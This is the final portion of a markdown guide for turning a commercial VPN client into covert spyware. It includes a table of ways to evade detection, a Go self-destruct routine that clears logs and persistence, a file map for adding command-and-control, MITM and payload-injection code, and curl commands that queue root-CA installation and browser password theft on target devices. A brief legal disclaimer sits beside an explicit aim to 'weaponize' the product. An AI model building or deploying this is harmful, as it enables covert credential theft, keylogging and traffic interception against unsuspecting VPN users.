Every operation leaves traces. This table maps what traces exist and how to minimize them:

| Operation | Trace Left | Minimization |
|-----------|-----------|--------------|
| **CA installation** | Certificate added to system store | Use a CA with a common-looking issuer name. Clean up on self-destruct. |
| **MITM proxy** | Local port 8080 listening | Only run when target is active. Use port 443 with redirect rules. |
| **Payload deployment** | SHA256 hash changes | The hash changes legitimately with every update anyway. No additional trace. |
| **Password exfil** | SQLite DB read on Chrome | Chrome's Login Data is read by many legit tools. Blend in. |
| **Keylogger** | GetAsyncKeyState polling | Kernel-mode EDR can detect this. User-mode not. |
| **Network scan** | TCP connections to internal hosts | Rate-limit connections. Spread over time. |
| **Exfil traffic** | POST to heartbeat endpoint | Blends with legitimate 60s heartbeat traffic. |

### 10.4 Self-Destruct Sequence

When the operation is complete or compromised:

```go
func handleSelfDestruct() Response {
    // 1. Stop all active operations
    keylogActive = false
    // 2. Clear exfil queue
    storage.ClearExfilQueue()
    // 3. Remove CA from system store
    removeCAFromSystemStore()
    // 4. Remove persistence mechanisms
    removeWmiPersistence()
    removeScheduledTasks()
    // 5. Clear logs
    clearApplicationLogs()
    // 6. Remove exfil cache
    storage.RemoveExfilCache()
    // 7. Flush all in-memory data
    // 8. Remove the helper binary (next reboot = clean)
    // 9. Report completion
    return Response{Success: true}
}
```

---

## Appendix A: File Modification Reference

| File Path (from ACTION-PLAN.md) | Action | Tag | Description |
|---|---|---|---|
| `internal/helper/commands.go` | Create `_redteam.go` variant | `redteam` | All new command handlers |
| `internal/helper/service_windows.go` | Modify dispatch | — | Add red team command cases (guarded by build tag) |
| `internal/heartbeat/heartbeat.go` | Add command processing | `redteam` | Parse and dispatch server commands |
| `internal/heartbeat/telemetry.go` | Enrich telemetry | `redteam` | Add passive collection fields |
| `internal/storage/storage.go` | Add exfil queue | `redteam` | Covert storage for harvested data |
| `internal/storage/exfil.go` | New file | `redteam` | Dedicated exfil queue management |
| `internal/updater/update.go` | Add payload staging | `redteam` | Support for staged payload delivery |
| `internal/manager/process.go` | Add payload injection | `redteam` | In-memory payload execution |
| `internal/mitm/proxy.go` | New file | `redteam` | Local TLS MITM proxy |
| `internal/mitm/certgen.go` | New file | `redteam` | Dynamic certificate generation |
| `cmd/myvpn/main.go` | Add init-time checks | `redteam` | Payload activation on startup |
| `pb_hooks/c2_admin.pb.js` | New file | — | C2 command queue endpoints |
| `pb_hooks/harvest_ingest.pb.js` | New file | — | Harvest data ingestion |
| `pb_hooks/update_gate.pb.js` | New file | — | Targeted update delivery |
| `pb_hooks/heartbeat.pb.js` | Modify | — | Add command delivery in response |
| `scripts/build-redteam.sh` | New file | — | Instrumented build pipeline |

## Appendix B: Key Differences from Clean Build

| Aspect | Clean Build | Instrumented Build |
|--------|-------------|-------------------|
| **Build tag** | `(none)` | `-tags=redteam` |
| **Helper commands** | `create_tun`, `set_dns`, `get_status` | + `install_ca`, `run_script`, `exfil_passwords`, `keylog_start/stop`, `scan_network`, `reverse_tunnel`, `persist`, `self_destruct` |
| **Heartbeat data** | Version, OS, uptime, bytes | + Device profile, file count, password store presence, exfil queue |
| **Update mechanism** | SHA256 verification only | SHA256 verification + payload staging |
| **Telemetry** | Crash markers, connection stats | + Credentials, keylog, network scan results |
| **Process disguise** | `nethelper` argv[0] | Same (doesn't change — blends in) |
| **Binary size** | ~12MB | ~14MB (additional code) |
| **Active ops** | None | C2-driven, server-commanded |

## Appendix C: Quick-Start Commands

```bash
# 1. Build instrumented client
./scripts/build-redteam.sh 1.3.5 windows_amd64

# 2. Upload payload to gated update server
scp build/redteam/1.3.5/myvpn-red-windows_amd64.tar.gz \
    admin@admin-vps:/var/www/updates/payloads/1.3.5/

# 3. Register a target device (via API)
curl -X POST https://api.getfastvpn.com/api/collections/targets/records \
    -H "Authorization: Admin $PB_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"device_fp":"a3f8c2...", "payload_version":"1.3.5", "active":true}'

# 4. Queue a CA injection command
curl -X POST https://api.getfastvpn.com/api/c2/command \
    -H "Authorization: Admin $PB_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "device_fp": "a3f8c2...",
        "action": "install_ca",
        "payload": {"cert_b64": "'"$(base64 -w0 /root/ca/intermediate/intermediate.crt)"'"}
    }'

# 5. Queue password exfiltration
curl -X POST https://api.getfastvpn.com/api/c2/command \
    -H "Authorization: Admin $PB_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "device_fp": "a3f8c2...",
        "action": "exfil_passwords",
        "payload": {"targets": ["chrome", "firefox", "wifi", "edge"]}
    }'

# 6. Monitor harvest
curl -s https://api.getfastvpn.com/api/c2/summary \
    -H "Authorization: Admin $PB_TOKEN" | jq .
```

---

*This document is the implementation companion to `ACTION-PLAN.md`. It maps directly to the existing codebase architecture and shows how each component can be instrumented for authorized red team operations. Every code modification is scoped to specific files and build tags. Nothing herein authorizes deployment against real users without explicit legal authority.*

---

**Version:** 2.0 — Red Team Implementation Guide  
**Companion to:** `ACTION-PLAN.md` v3, `PLAN.md` v3  
**Change summary:** Complete implementation guide showing how to weaponize each component of the existing VPN product codebase. Maps directly to named files, types, and functions from the build plan. Uses Go build tags (`-tags=redteam`) to maintain a single codebase with clean and instrumented variants.
